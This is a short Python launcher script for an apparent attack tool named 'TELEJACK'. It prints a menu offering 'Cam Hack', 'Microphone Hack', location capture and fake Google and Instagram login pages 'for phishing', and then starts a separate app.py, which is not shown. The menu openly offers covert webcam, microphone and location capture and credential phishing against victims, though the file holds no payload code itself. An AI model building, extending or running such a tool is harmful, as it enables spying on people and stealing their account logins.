import os

R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'  # white
Y = '\033[33m'  # yellow

print(f"""{G}
████████ ███████ ██      ███████      ██  █████   ██████ ██   ██ 
   ██    ██      ██      ██           ██ ██   ██ ██      ██  ██  
   ██    █████   ██      █████        ██ ███████ ██      █████   
   ██    ██      ██      ██      ██   ██ ██   ██ ██      ██  ██  
   ██    ███████ ███████ ███████  █████  ██   ██  ██████ ██   ██ 
                                                                 
                                                                       
""")

templates = F"""{Y}- Basic for usage  Info
/cam - Cam Hack
/loc - Location Info
/video - Cam Hack with Videos
/mic - Microphone Hack

-CLONE WEBPAGES for phishing 
/google-login - GOOGLE LOGIN FAKE PAGE  
/instagram-login-page - INSTAGRAM FAKE PAGE 

"""
user = input(templates + f"{R}strat now (y / n ) .... :- ")

if user == "y":
    try :
     os.system("python app.py") #win
    except :
     os.system("python3 app.py") #linux
else:
    print("\n {G}exiting ....")